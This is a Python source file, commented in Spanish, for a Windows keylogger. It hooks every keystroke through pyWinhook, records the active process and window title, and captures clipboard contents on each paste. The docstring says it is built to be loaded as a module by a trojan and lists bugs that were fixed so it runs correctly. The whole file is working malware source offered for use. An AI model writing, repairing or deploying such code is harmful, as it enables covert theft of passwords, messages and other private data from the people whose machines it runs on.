"""
keylogger.py - Keylogger con captura de portapapeles (Windows)
==============================================================
Registra las pulsaciones de teclado del sistema usando pyWinhook,
captura el contenido del portapapeles al detectar Ctrl+V y devuelve
el log completo como string. Diseñado para ejecutarse durante un tiempo
determinado (TIMEOUT segundos) y ser llamado como módulo por un troyano.

ERRORES CORREGIDOS:
    1. `import pyWinhook as pyHook import sys` → sintaxis de import
       combinada inválida. Corregido a dos líneas separadas:
       `import pyWinhook as pyHook` y `import sys`.
    2. `while time.thread_time() < TIMEOUT:` → `time.thread_time()` mide
       tiempo de CPU del hilo, no tiempo real transcurrido. Para un timeout
       por tiempo real se debe usar `time.time()`. Además, se necesita
       guardar el tiempo de inicio. Corregido.
    3. `if __name__ == '__main__':` estaba indentado dentro del cuerpo de
       la clase Keylogger (nivel de método), haciéndolo sintácticamente
       inválido o inalcanzable. Movido al nivel de módulo.
    4. `print(run())` → `run` es un método de instancia, no una función
       de módulo. Corregido a `kl_runner = Keylogger(); print(kl_runner.run())`.

REQUISITOS:
    pip install pyWinhook pywin32 pythoncom

EJEMPLOS DE EJECUCIÓN:
    python keylogger.py
    # Registra teclas durante TIMEOUT segundos y las imprime al terminar.
"""

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as pyHook   # FIX: separado del import de sys
import sys
import time
import win32clipboard

TIMEOUT = 60 * 10  # Duración del registro en segundos (10 minutos)


class Keylogger:
    """
    Registra las pulsaciones de teclado y el contenido del portapapeles
    del sistema Windows usando pyWinhook.
    """

    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        """
        Obtiene el PID, nombre del ejecutable y título de la ventana
        activa en el momento de la llamada y los imprime.
        """
        hwnd       = windll.user32.GetForegroundWindow()
        pid        = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        executable    = create_string_buffer(512)
        h_process     = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        window_title  = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)

        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: Título de ventana desconocido')

        print('\n', process_id, executable.value.decode(), self.current_window)

        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        """
        Callback invocado por pyWinhook en cada pulsación de tecla.

        Args:
            event: Objeto de evento de pyWinhook con .WindowName, .Ascii, .Key.

        Returns:
            bool: True para que el evento continúe propagándose.
        """
        if event.WindowName != self.current_window:
            self.get_current_process()

        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V':
                # Detectar Ctrl+V: capturar el portapapeles
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'[{event.Key}]')
        return True

    def run(self):
        """
        Activa el hook de teclado, redirige stdout a un buffer y captura
        pulsaciones durante TIMEOUT segundos.

        Returns:
            str: Log de las pulsaciones y eventos capturados.
        """
        save_stdout = sys.stdout
        sys.stdout  = StringIO()

        kl = Keylogger()
        hm = pyHook.HookManager()
        hm.KeyDown = kl.mykeystroke
        hm.HookKeyboard()

        # FIX: `time.thread_time()` → `time.time()` para medir tiempo real
        #       Además se guarda el tiempo de inicio para comparar la diferencia
        start_time = time.time()
        while (time.time() - start_time) < TIMEOUT:
            pythoncom.PumpWaitingMessages()

        log = sys.stdout.getvalue()
        sys.stdout = save_stdout
        return log


# FIX: bloque movido al nivel de módulo (antes estaba dentro de la clase)
if __name__ == '__main__':
    kl_runner = Keylogger()
    print(kl_runner.run())
    print('done.')
